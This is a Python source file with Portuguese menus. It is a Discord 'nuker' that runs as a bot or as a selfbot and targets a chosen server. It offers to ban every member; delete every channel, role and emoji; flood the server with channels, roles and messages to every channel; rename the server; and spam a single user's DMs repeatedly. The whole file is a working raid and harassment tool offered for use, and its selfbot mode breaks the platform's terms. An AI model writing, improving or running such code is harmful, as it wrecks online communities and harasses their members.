import discord
import asyncio
import time
import random
import os
from discord.ext import commands
from discord.ext.commands import has_permissions
from discord.utils import get
import colorama
from colorama import Fore, Back, Style
colorama.init()

try:
        arq_token = open('token.txt','r')
        token = arq_token.readline()
except:
        print("arquivo 'token.txt' não encontrado.\ncriando o arquivo...")
        criar = open('token.txt', 'w')
        criar.close()
        input('arquivo criado\nreinicie o programa')
        quit()

while True:
	bot_ou_self = int(input("[1] - bot\n[2] - selfbot\n\nescolha: "))
	if bot_ou_self == 1 or bot_ou_self == 2:
		break
	else:
		os.system("cls")

os.system("cls")
print("carregando...")

intents = discord.Intents.default()
intents.members = True
if bot_ou_self == 1:
	bot_type = [False, True]
if bot_ou_self == 2:
	bot_type = [True, False]

client = commands.Bot(intents = intents, command_prefix='!', self_bot=bot_type[0])

@client.event
async def on_ready():
	os.system("cls")
	print('\033[31m' + "=================================================================")
	print('')
	print('\033[31m' + "+==================== DEVELOPED BY mino#2914 ====================+")
	print('')
	print('\033[31m' + "=================================================================")
	while True:
		id_servidor = int(input("digite o id do servidor: "))
		if client.get_guild(id_servidor) == None:
			print("este id não pertence a um servidor ou o bot/selfbot não está nele")
			time.sleep(1)
		else:
			break
		os.system("cls")
	os.system("cls")
	while True:
		os.system("cls")
		servidor = client.get_guild(id_servidor)
		escolha = input("[1] - criar canais\n[2] - criar cargos\n[3] - enviar mensagem para todos os canais\n[4] - mudar nome do servidor\n[5] - banir todos\n[6] - deletar canais\n[7] - deletar cargos\n[8] - deletar emojis\n[9] - spamma DM\n\n[0] - mudar de servidor\n\nescolha: ")
		if escolha =='0':
			while True:
				id_servidor = int(input("digite o id do servidor: "))
				if client.get_guild(id_servidor) == None:
					print("este id não pertence a um servidor ou o bot/selfbot não está nele")
					time.sleep(1)
				else:
					break
				os.system("cls")
		if escolha =='1':
			try:
				os.system("cls")
				tipo = input('[1] - texto\n[2] - voz\n\nescolha: ')
				if tipo =='1':
					os.system("cls")
					nome = input("nome: ")
					quantidade = int(input("quantidade: "))
					os.system("cls")
					print("criando...")
					for q in range(quantidade):
						await servidor.create_text_channel(str(nome))
						print(f'canal de texto criado: {nome}')
					os.system("cls")
					continue
				if tipo =='2':
					os.system("cls")
					nome = input("nome: ")
					quantidade = int(input("quantidade: "))
					os.system("cls")
					for q in range(quantidade):
						await servidor.create_voice_channel(str(nome))
						print(f'canal de voz criado: {nome}')
					os.system("cls")
					continue
			except:
				pass
		if escolha =='2':
			try:
				os.system("cls")
				nome = input("nome: ")
				quantidade = int(input("quantidade: "))
				os.system("cls")
				for n in range(quantidade):
					await servidor.create_role(name=nome, colour = discord.Colour.orange())
					print(f'cargo criado: {nome}')
				os.system("cls")
				continue
			except:
				pass
		if escolha =='3':
			try:
				os.system("cls")
				mensagem = input("digite a mensagem: ")
				os.system("cls")
				for channel in servidor.channels:
					try:
						await channel.send(mensagem)
						print(f'mensagem enviada para: {channel}')
					except:
						pass
				os.system("cls")
			except:
				pass
		if escolha =='4':
			try:
				os.system("cls")
				nome_servidor = input("digite o nome do servidor: ")
				os.system("cls")
				print("alterando...")
				await servidor.edit(name=nome_servidor)
				os.system("cls")
				continue
			except:
				os.system("cls")
				print("o nome deve conter mais caracteres")
				time.sleep(3)
				os.system("cls")
				pass
		if escolha =='5':
			try:
				os.system("cls")
				for member in servidor.members:
					try:
						await member.ban()
					except discord.HTTPException as e:
						print(f"erro ao banir: {member.name} id: {member.id}. não tem permissão")
						continue
					else:
						print(f"pessoa banida: {member.name} id: {member.id}")
				os.system("cls")
				continue
			except:
				pass
		if escolha =='6':
			try:
				os.system("cls")
				for channel in servidor.channels:
					await channel.delete()
					print(f'canal deletado: {channel}')
				os.system("cls")
				continue
			except:
				pass
		if escolha =='7':
			try:
				for role in servidor.roles:
					try:
						await role.delete()
					except discord.HTTPException as e:
						print(f"erro ao deletar o cargo: {role.name}. não tem permissão")
						continue
					else:
						print(f"cargo deletado: {role.name}")
				os.system("cls")
				continue
			except:
				pass
		if escolha =='8':
			try:
				os.system("cls")
				for emoji in servidor.emojis:
					await emoji.delete()
					print(f'emoji deletado: {emoji}')
				os.system("cls")
				continue
			except:
				pass
		if escolha =='9':
			try:
				os.system("cls")
				id_membro = int(input("digite o id do usuario: "))
				us = client.get_user(id_membro)
				while us == None:
					print("este id não pertence a um usuario!")
					time.sleep(1)
					os.system("cls")
					id_membro = int(input("digite o id do usuario: "))
					us = client.get_user(id_membro)
				mensagem = str(input("mensagem: "))
				quantas = int(input("quantas vezes quer enviar a mensagem: "))
				for c in range(quantas):
					await client.get_user(id_membro).send(mensagem)
					print(f'{us}: mensagem enviada "{mensagem}"')
				os.system("cls")
				continue
			except:
				pass

try:
        client.run(token, bot=bot_type[1])
except discord.errors.LoginFailure:
        input("token inválido!\naperte qualquer tecla para fechar...")
        quit()
except discord.errors.PrivilegedIntentsRequired:
	print("\nO seu bot não possui o 'intents' habilitado.\n\npara habilitar basta ir no site https://discord.com/developers/applications/ \nPASSO 1: escolha o seu bot\nPASSO 2: vá na aba 'Bot' e habilite o 'SERVER MEMBERS INTENT'")
	input("\n\naperte enter para fechar...")
	quit()